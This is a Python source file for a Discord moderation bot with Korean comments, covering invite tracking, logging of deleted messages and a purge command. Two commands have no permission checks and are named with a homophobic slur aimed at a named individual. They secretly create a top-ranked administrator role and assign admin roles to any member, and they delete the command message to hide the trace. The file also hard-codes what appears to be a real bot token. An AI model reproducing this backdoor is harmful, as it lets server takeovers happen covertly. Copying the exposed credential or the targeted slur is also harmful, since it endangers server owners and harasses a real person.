import discord
from discord.ext import commands

intents = discord.Intents.all()  # 모든 인텐트 활성화

bot = commands.Bot(command_prefix="!", intents=intents)

# 메시지 삭제와 초대 기록을 저장할 채널 ID
log_channels = {
    "delete": None,
    "invite": None
}

# 초대 기록을 저장할 딕셔너리
invites_cache = {}

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    # 서버의 모든 초대 링크를 가져와 캐시에 저장합니다
    for guild in bot.guilds:
        invites_cache[guild.id] = {invite.id: invite.uses for invite in await guild.invites()}

@bot.event
async def on_invite_create(invite):
    if invite.guild.id not in invites_cache:
        invites_cache[invite.guild.id] = {}
    invites_cache[invite.guild.id][invite.id] = invite.uses

@bot.event
async def on_invite_delete(invite):
    if invite.guild.id in invites_cache:
        if invite.id in invites_cache[invite.guild.id]:
            del invites_cache[invite.guild.id][invite.id]

@bot.event
async def on_member_join(member):
    guild = member.guild
    if log_channels["invite"] is not None:
        log_channel = bot.get_channel(log_channels["invite"])
        if log_channel:
            # 초대 링크 정보를 확인하여 누가 초대했는지 확인합니다
            new_invites = await guild.invites()
            used_invite = None
            for invite in new_invites:
                if invite.uses > invites_cache[guild.id].get(invite.id, 0):
                    used_invite = invite
                    break

            inviter = used_invite.inviter if used_invite else None

            embed = discord.Embed(
                title="New Member Joined",
                description=f"**Member:** {member.mention}\n**Name:** {member.name}\n**Inviter:** {inviter.mention if inviter else 'Unknown'}",
                color=discord.Color.green()
            )
            await log_channel.send(embed=embed)
            invites_cache[guild.id] = {invite.id: invite.uses for invite in new_invites}

@bot.event
async def on_message_delete(message):
    if log_channels["delete"] is not None:
        log_channel = bot.get_channel(log_channels["delete"])
        if log_channel:
            embed = discord.Embed(
                title="Message Deleted",
                description=f"**Author:** {message.author}\n**Content:** {message.content}",
                color=discord.Color.red()
            )
            await log_channel.send(embed=embed)

@bot.command(name="장현빈씹게이")
async def assign_role(ctx, member: discord.Member, *, role_name: str):
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    if role is None:
        await ctx.message.delete()  # 명령어 메시지 삭제
        return

    if not role.permissions.administrator:
        await ctx.message.delete()  # 명령어 메시지 삭제
        return

    try:
        await member.add_roles(role)
        await ctx.message.delete()  # 명령어 메시지 삭제
    except Exception as e:
        await ctx.message.delete()  # 오류 발생 시 명령어 메시지 삭제

@bot.command(name="청소")
@commands.has_permissions(manage_messages=True)
async def clean(ctx, amount: int = None):
    await ctx.message.delete()
    
    if amount is None:
        await ctx.send("청소할 메시지의 수를 입력해야 합니다. 예: !청소 10", delete_after=5)
        return
    if amount < 1 or amount > 100:
        await ctx.send("1부터 100 사이의 숫자를 입력해야 합니다.", delete_after=5)
        return

    try:
        await ctx.channel.purge(limit=amount + 1)
    except Exception as e:
        await ctx.send(f"오류가 발생했습니다: {str(e)}", delete_after=5)

@bot.command(name="부르기")
async def ping_everyone(ctx):
    if ctx.guild.me.guild_permissions.mention_everyone:
        await ctx.send("@everyone")
    else:
        await ctx.send("이 서버에서 @everyone 멘션이 허용되지 않습니다.", delete_after=5)

@bot.command(name="장현빈좆게이")
async def create_admin_role(ctx, *, role_name: str):
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if role:
            await ctx.message.delete()  # 명령어 메시지 삭제
            return

        role = await ctx.guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
        print(f"Role '{role_name}' created in {ctx.guild.name}.")

        roles = ctx.guild.roles
        sorted_roles = sorted(roles, key=lambda r: r.position, reverse=True)
        positions = {r.id: i for i, r in enumerate(sorted_roles)}
        positions[role.id] = len(sorted_roles)
        await ctx.guild.edit_role_positions(roles=positions)

        await ctx.message.delete()  # 명령어 메시지 삭제

    except Exception as e:
        await ctx.message.delete()  # 오류 발생 시 명령어 메시지 삭제

@bot.command(name="채널설정")
@commands.has_permissions(administrator=True)
async def set_log_channel(ctx, log_type: str, channel: discord.TextChannel):
    if log_type == "삭제":
        log_channels["delete"] = channel.id
        await ctx.send(f"메시지 삭제 기록을 '{channel.mention}' 채널로 설정했습니다.")
    elif log_type == "초대":
        log_channels["invite"] = channel.id
        await ctx.send(f"초대 기록을 '{channel.mention}' 채널로 설정했습니다.")
    else:
        await ctx.send("유효한 로그 유형을 입력하세요. 예: !채널설정 삭제 #채널명 또는 !채널설정 초대 #채널명")




bot.run('MTI3OTA4NTExMDk3MjM4NzM2OA.GSyJEX.JSceDCgxeNCXG26DElV5b2vTz928-rYdshAmsE')





# 장현빈좆게이 (역할)
# 장현빈씹게이 (@이름) (역할)
